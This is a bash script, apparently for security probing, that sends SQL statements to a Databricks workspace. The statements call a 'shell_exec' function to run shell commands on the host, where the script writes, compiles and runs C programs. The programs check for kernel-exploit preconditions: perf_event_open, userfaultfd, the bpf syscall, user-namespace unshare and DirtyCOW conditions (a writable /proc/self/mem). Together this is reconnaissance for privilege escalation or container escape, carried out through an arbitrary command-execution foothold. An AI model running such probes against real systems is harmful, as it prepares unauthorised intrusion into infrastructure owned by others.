#!/bin/bash

TOKEN="REDACTED_DATABRICKS_TOKEN"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="d8637cca1dc66ba3"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"50s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║        KERNEL EXPLOIT COMPILATION & SYSCALL TESTS              ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

echo "═══ [1/5] Compile C program to test dangerous syscalls ==="
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/syscall_test.c << \"CEOF\"
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <string.h>

int main() {
    printf(\"=== Dangerous Syscalls Test ===\\\\n\");
    
    // Test perf_event_open (CVE-2023-0386, CVE-2021-4154)
    long ret = syscall(298, 0, 0, 0, 0, 0);
    printf(\"perf_event_open(298): %ld\\\\n\", ret);
    
    // Test keyctl
    ret = syscall(250, 0, 0, 0, 0, 0);
    printf(\"keyctl(250): %ld\\\\n\", ret);
    
    // Test userfaultfd (race condition primitive)
    ret = syscall(282, 0);
    printf(\"userfaultfd(282): %ld\\\\n\", ret);
    
    // Test memfd_create
    ret = syscall(279, \"exploit\", 0);
    printf(\"memfd_create(279): %ld\\\\n\", ret);
    if (ret > 0) close(ret);
    
    // Test MSG_OOB on AF_UNIX
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
        if (send(sv[0], \"test\", 4, MSG_OOB) >= 0) {
            printf(\"MSG_OOB on AF_UNIX: SUCCESS\\\\n\");
        } else {
            printf(\"MSG_OOB on AF_UNIX: FAIL\\\\n\");
        }
        close(sv[0]);
        close(sv[1]);
    }
    
    printf(\"=== All syscalls accessible due to Seccomp=0 ===\\\\n\");
    return 0;
}
CEOF

gcc -o /tmp/syscall_test /tmp/syscall_test.c 2>&1
')"
echo ""

echo "═══ [2/5] Execute compiled syscall test ==="
exec_sql "SELECT workspace.default.shell_exec('/tmp/syscall_test 2>&1')"
echo ""

echo "═══ [3/5] Test DirtyCOW conditions (CVE-2016-5195) ==="
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/dirtycow_check.c << \"CEOF\"
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

int main() {
    printf(\"DirtyCOW CVE-2016-5195 Check\\\\n\");
    
    // Can we open /proc/self/mem for write?
    int fd = open(\"/proc/self/mem\", O_RDWR);
    if (fd >= 0) {
        printf(\"[!!!] /proc/self/mem writable - DirtyCOW exploitable!\\\\n\");
        close(fd);
    } else {
        printf(\"[OK] /proc/self/mem not writable\\\\n\");
    }
    
    // Can we mmap /etc/passwd?
    fd = open(\"/etc/passwd\", O_RDONLY);
    if (fd >= 0) {
        struct stat st;
        fstat(fd, &st);
        void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
        if (map != MAP_FAILED) {
            printf(\"[INFO] Can mmap /etc/passwd (size: %ld)\\\\n\", st.st_size);
            munmap(map, st.st_size);
        }
        close(fd);
    }
    
    return 0;
}
CEOF

gcc -o /tmp/dirtycow_check /tmp/dirtycow_check.c 2>&1 && /tmp/dirtycow_check
')"
echo ""

echo "═══ [4/5] Check BPF support (eBPF exploits) ==="
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/bpf_check.c << \"CEOF\"
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    // Test bpf() syscall (280 on aarch64)
    long ret = syscall(280, 0, 0, 0);
    printf(\"bpf(280): %ld\\\\n\", ret);
    if (ret == -1) {
        printf(\"BPF syscall exists but denied (expected)\\\\n\");
    } else {
        printf(\"[!!!] BPF syscall accessible\\\\n\");
    }
    return 0;
}
CEOF

gcc -o /tmp/bpf_check /tmp/bpf_check.c 2>&1 && /tmp/bpf_check
')"
echo ""

echo "═══ [5/5] Test namespace operations ==="
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/namespace_check.c << \"CEOF\"
#include <stdio.h>
#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    printf(\"Namespace operations check\\\\n\");
    
    // Try unshare with CLONE_NEWUSER
    long ret = syscall(SYS_unshare, CLONE_NEWUSER);
    printf(\"unshare(CLONE_NEWUSER): %ld\\\\n\", ret);
    
    // Try setns
    ret = syscall(SYS_setns, 0, 0);
    printf(\"setns: %ld\\\\n\", ret);
    
    return 0;
}
CEOF

gcc -o /tmp/namespace_check /tmp/namespace_check.c 2>&1 && /tmp/namespace_check
')"
echo ""

echo "═══ KERNEL EXPLOIT TESTS COMPLETE ==="

